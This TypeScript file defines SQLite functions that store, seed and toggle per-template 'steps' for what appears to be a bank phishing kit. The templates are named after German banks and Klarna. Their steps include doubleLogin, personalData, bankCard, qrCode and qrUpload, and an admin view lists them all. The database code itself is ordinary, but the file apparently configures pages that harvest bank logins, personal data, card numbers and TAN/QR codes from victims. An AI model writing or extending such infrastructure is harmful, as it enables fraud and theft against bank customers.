import SQLiteDatabase from 'better-sqlite3';

export function initTemplateStepConfigsTable(db: ReturnType<typeof SQLiteDatabase>): void {
  try {
    // Create template_step_configs table
    db.exec(`
      CREATE TABLE IF NOT EXISTS template_step_configs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        template_id INTEGER NOT NULL,
        step_name VARCHAR(50) NOT NULL,
        is_enabled BOOLEAN DEFAULT 1,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (template_id) REFERENCES templates(id) ON DELETE CASCADE,
        UNIQUE(template_id, step_name)
      )
    `);

    // Create trigger to update updated_at timestamp
    db.exec(`
      CREATE TRIGGER IF NOT EXISTS update_template_step_configs_updated_at
      AFTER UPDATE ON template_step_configs
      FOR EACH ROW
      BEGIN
        UPDATE template_step_configs SET updated_at = CURRENT_TIMESTAMP WHERE id = NEW.id;
      END
    `);

    console.log('✅ Template step configs table initialized successfully');
  } catch (error) {
    console.error('❌ Error creating template_step_configs table:', error);
    throw error;
  }
}

/**
 * Insert default step configurations for all templates
 */
export function insertDefaultStepConfigs(db: ReturnType<typeof SQLiteDatabase>): void {
  try {
    // Get all existing templates
    const templates = db.prepare('SELECT id, folder_name FROM templates').all() as Array<{id: number, folder_name: string}>;
    
    // Define default step configurations for each template
    const defaultConfigs: Record<string, string[]> = {
      'santander': ['doubleLogin', 'personalData', 'qrCode', 'bankCard'],
      'commerzbank': ['doubleLogin', 'personalData', 'bankCard', 'qrCode'],
      'comdirect': ['doubleLogin', 'personalData', 'bankCard', 'qrCode'],
      'apobank': ['doubleLogin', 'personalData', 'bankCard'],
      'postbank': ['doubleLogin', 'personalData', 'bankCard', 'qrCode'],
      'sparkasse': ['branchSelection', 'doubleLogin', 'personalData', 'bankCard'],
      'volksbank': ['branchSelection', 'doubleLogin', 'personalData', 'qrUpload', 'bankCard'],
      'consorsbank': ['doubleLogin', 'personalData', 'bankCard'],
      'ingdiba': ['doubleLogin', 'personalData', 'bankCard', 'qrCode'],
      'deutsche_bank': ['multiFieldLogin', 'doubleLogin', 'personalData', 'qrCode', 'bankCard'],
      'dkb': ['doubleLogin', 'personalData', 'qrUpload', 'bankCard'],
      'targobank': ['doubleLogin', 'personalData', 'qrUpload', 'bankCard'],
      'klarna': ['bankSelection', 'branchSelection', 'doubleLogin', 'personalData', 'bankCard'],
      'credit-landing': ['bankCard', 'personalData']
    };

    const insertStmt = db.prepare(`
      INSERT OR IGNORE INTO template_step_configs (template_id, step_name, is_enabled)
      VALUES (?, ?, 1)
    `);

    let totalInserted = 0;
    
    // Insert default configurations for each template
    for (const template of templates) {
      const steps = defaultConfigs[template.folder_name];
      if (steps) {
        for (const stepName of steps) {
          try {
            const result = insertStmt.run(template.id, stepName);
            if (result.changes > 0) {
              totalInserted++;
              console.log(`✅ Added step config: ${template.folder_name} -> ${stepName}`);
            }
          } catch (error) {
            console.warn(`⚠️ Skipped duplicate config: ${template.folder_name} -> ${stepName}`);
          }
        }
      } else {
        console.log(`⚠️ No default config found for template: ${template.folder_name}`);
      }
    }

    console.log(`✅ Inserted ${totalInserted} default step configurations`);
  } catch (error) {
    console.error('❌ Error inserting default step configs:', error);
    throw error;
  }
}

/**
 * Get step configuration for a template
 */
export function getTemplateStepConfig(db: ReturnType<typeof SQLiteDatabase>, templateId: number): Record<string, boolean> {
  try {
    const configs = db.prepare(`
      SELECT step_name, is_enabled
      FROM template_step_configs
      WHERE template_id = ?
    `).all(templateId) as Array<{step_name: string, is_enabled: number}>;

    const result: Record<string, boolean> = {};
    for (const config of configs) {
      result[config.step_name] = config.is_enabled === 1;
    }

    return result;
  } catch (error) {
    console.error('❌ Error getting template step config:', error);
    return {};
  }
}

/**
 * Update step configuration for a template
 */
export function updateTemplateStepConfig(
  db: ReturnType<typeof SQLiteDatabase>, 
  templateId: number, 
  stepName: string, 
  isEnabled: boolean
): boolean {
  try {
    const result = db.prepare(`
      UPDATE template_step_configs 
      SET is_enabled = ?, updated_at = CURRENT_TIMESTAMP
      WHERE template_id = ? AND step_name = ?
    `).run(isEnabled ? 1 : 0, templateId, stepName);

    return result.changes > 0;
  } catch (error) {
    console.error('❌ Error updating template step config:', error);
    return false;
  }
}

/**
 * Get all step configurations for all templates (for admin interface)
 */
export function getAllTemplateStepConfigs(db: ReturnType<typeof SQLiteDatabase>) {
  try {
    const configs = db.prepare(`
      SELECT 
        tsc.id,
        tsc.template_id,
        t.name as template_name,
        t.folder_name,
        tsc.step_name,
        tsc.is_enabled,
        tsc.created_at,
        tsc.updated_at
      FROM template_step_configs tsc
      JOIN templates t ON tsc.template_id = t.id
      ORDER BY t.name, tsc.step_name
    `).all();

    return configs;
  } catch (error) {
    console.error('❌ Error getting all template step configs:', error);
    return [];
  }
}
